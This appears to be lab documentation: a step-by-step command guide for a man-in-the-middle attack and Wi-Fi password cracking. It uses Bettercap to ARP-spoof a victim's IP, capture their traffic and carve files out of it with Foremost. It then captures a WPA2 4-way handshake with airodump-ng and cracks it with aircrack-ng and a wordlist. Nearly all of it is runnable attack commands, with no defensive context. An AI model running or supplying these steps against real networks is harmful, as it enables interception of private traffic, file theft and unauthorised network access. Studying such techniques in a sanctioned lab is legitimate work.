# File Carving & WPA2 4-Way Handshake Cracking Documentation

## Tools Used
- **Bettercap** – For MITM attacks and packet capturing.
- **Wireshark** – For analyzing captured packets.
- **Foremost** – For file carving from packet captures.
- **Aircrack-ng** – For WPA2 handshake cracking.
- **Airmon-ng & Airodump-ng** – For monitoring wireless traffic and capturing WPA2 handshakes.

---

## Setting Up the Network Adapter

### For Wireless Interfaces (Monitor Mode)
1. Identify your network interface:
   ```bash
   sudo iwconfig
   ```
2. Put the wireless adapter in monitor mode:
   ```bash
   sudo airmon-ng start <interface_name>
   ```
   *Replace `<interface_name>` with the correct network interface (e.g., wlan0).*

### For Wired Interfaces (Bridge Mode)
1. Create a network bridge:
   ```bash
   sudo brctl addbr bridge0
   ```
2. Add your network interface to the bridge:
   ```bash
   sudo brctl addif bridge0 <interface_name>
   ```
3. Bring up the bridge:
   ```bash
   sudo ifconfig bridge0 up
   ```

---

## Using Bettercap for MITM (with PCAP File)

### Step 1: Start Bettercap
Run Bettercap with the correct network interface:
```bash
sudo bettercap -iface <interface_name>
```
*Replace `<interface_name>` with your network interface, e.g., eth0, wlan0.*

### Step 2: Enable Packet Capture
Inside the Bettercap interactive console, run:
```bash
set net.sniff.output output.pcap
net.sniff on
```

### Step 3: Start ARP Spoofing
```bash
set arp.spoof.targets <target_IP>
arp.spoof on
```
*Replace `<target_IP>` with the victim’s IP address.*

### Step 4: Capture HTTP Requests
If targeting HTTP traffic:
```bash
set http.server.address <your_IP>
set http.server.path /tmp
http.server on
```
Using our edited HTTP, we created a file upload server.

### Step 5: Stop Packet Capture
```bash
net.sniff off
arp.spoof off
```

### Step 6: Exit Bettercap
```bash
exit
```

---

## Analyzing the PCAP File
The captured packets are stored in `output.pcap`. Open it with Wireshark:
```bash
wireshark output.pcap
```

---

## File Carving from PCAP
Use Foremost to extract files:
```bash
sudo foremost -i output.pcap -o extracted_files
```
### Review the Extracted Files
Navigate to the output directory:
```bash
cd extracted_files
```
Check inside directories categorized by file type (e.g., jpg, gif, png, etc.).

---

## WPA2 4-Way Handshake Cracking

### Step 1: Capture WPA2 Handshake
1. Start monitoring mode:
   ```bash
   sudo airmon-ng start wlan0
   ```
2. Start capturing packets:
   ```bash
   sudo airodump-ng -c <channel> --bssid <router_BSSID> -w handshake_capture wlan0mon
   ```
   *Replace `<channel>` with the router’s channel and `<router_BSSID>` with the target’s MAC address.*

### Step 2: Crack the WPA2 Key
Use Aircrack-ng with a wordlist:
```bash
sudo aircrack-ng -w <wordlist> -b <router_BSSID> handshake_capture.cap
```
*Replace `<wordlist>` with a password list and `<router_BSSID>` with the target’s MAC.*

